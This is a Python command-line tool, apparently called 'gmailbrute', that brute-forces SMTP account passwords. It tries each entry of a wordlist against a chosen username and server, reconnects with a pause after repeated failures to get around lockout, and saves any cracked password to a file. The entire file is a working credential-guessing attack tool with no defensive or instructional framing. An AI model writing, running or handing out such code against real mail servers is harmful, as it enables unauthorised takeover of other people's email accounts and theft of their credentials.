#!/usr/bin/python

import os
import time
import smtplib
import argparse
import fileinput
import socket
from colorama import Fore,Back,Style


def banner():
	os.system('clear')
	print(Fore.GREEN + """


                                                                          
      _/_/_/                                  _/                          
   _/        _/_/_/      _/_/      _/_/_/  _/_/_/_/    _/_/    _/  _/_/   
    _/_/    _/    _/  _/_/_/_/  _/          _/      _/_/_/_/  _/_/        
       _/  _/    _/  _/        _/          _/      _/        _/           
_/_/_/    _/_/_/      _/_/_/    _/_/_/      _/_/    _/_/_/  _/            
         _/                                                               
        _/                                                                

                     Created by th3j0k3r
	_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/

""")


#
# begin the crack
#
def begin ():
	banner()

	try:

		# Create the smtp object.
		bruteforce()
	except KeyboardInterrupt:
		print(Fore.GREEN + "[*] Exiting Program..")
		return

#
# The bruteforce algorithm
#
def bruteforce():
	
	global attempts
	attempts = 1

	try:
		# Check if the wordlist exists
		if (os.path.isfile(args.w) == False):
			print(Fore.RED + "[!] Wordlist does not exist")
			return
		try:

			smtp = smtplib.SMTP(args.s, args.p)
			smtp.set_debuglevel(args.v)
			smtp.ehlo()
			smtp.starttls()
			smtp.ehlo()
		except socket.error:
			print(Fore.RED + "[!] The server is incorrect")
			return

		# iterate through each line.
		finput = fileinput.input(args.w)
		for line in finput:
			password = format(line.strip())

			try:
				# Print the attempts
				print(Fore.WHITE + "----------------------------------------------------------") 
				print(Fore.WHITE + "[+] " + Fore.RED + str(attempts) + Fore.WHITE + " Trying " + Fore.YELLOW + "'" + password + "'"  + Fore.WHITE + " against " + Fore.WHITE + args.u)
				print(Fore.WHITE + "----------------------------------------------------------") 
										
				# Attempt to login.
				smtp.login(args.u, password)

# Write the cracked password to a file.
				f = open('passwords/' + args.u, 'w')
				f.write('username: '  + args.u + '\n')
				f.write('password: ' + password + '\n')
				f.close()

				# Print thhe username & password out to the terminal.
				print(Fore.WHITE + "====================================================================")
				print(Fore.WHITE + "[*] Found it!, " + Fore.WHITE + "username: " + Fore.GREEN + args.u + Fore.WHITE + " password: " + Fore.GREEN + password)
				print(Fore.WHITE + "====================================================================")
				smtp.quit()
				finput.close()	
				return


			except smtplib.SMTPAuthenticationError:
				if (attempts >= 3):
					print(Fore.WHITE + "[+] Reinitializing socket")
					attempts = 1
					smtp.quit()	
					time.sleep(10)
					smtp = smtplib.SMTP(args.s, args.p)
					smtp.set_debuglevel(args.v)
					smtp.ehlo()
					smtp.starttls()
					smtp.ehlo()
				else:

					attempts = attempts + 1
					print(Fore.RED + "[!] Wrong password")

					
				

				
	except KeyboardInterrupt:
		print(Fore.GREEN + "[*] Exiting Program..")
		smtp.quit()
		finput.close()	
		return

# Arguments
def Args ():

	# Create the arguments.
	parser = argparse.ArgumentParser(description="Brute forces SMTP Passwords")
	required_args = parser.add_argument_group('Required Arguments')
	required_args.add_argument('--username', dest='u',  type=str, required=True)
	required_args.add_argument('--wordlist', dest='w',  type=str, required=True)
	required_args.add_argument('--server',   dest='s',  type=str, required=True)
	required_args.add_argument('--port',     dest='p',  type=int, required=True)

	optional_args = parser.add_argument_group('Optional Arguments')
	required_args.add_argument('--verbosity',     dest='v',  type=int, required=False)



	global args
	args = parser.parse_args()


	if args.u != None and args.w != None and args.s != None and args.p != None:
		begin()
	else:
		print("Please specify python gmailbrute.py -h for more options")

Args()
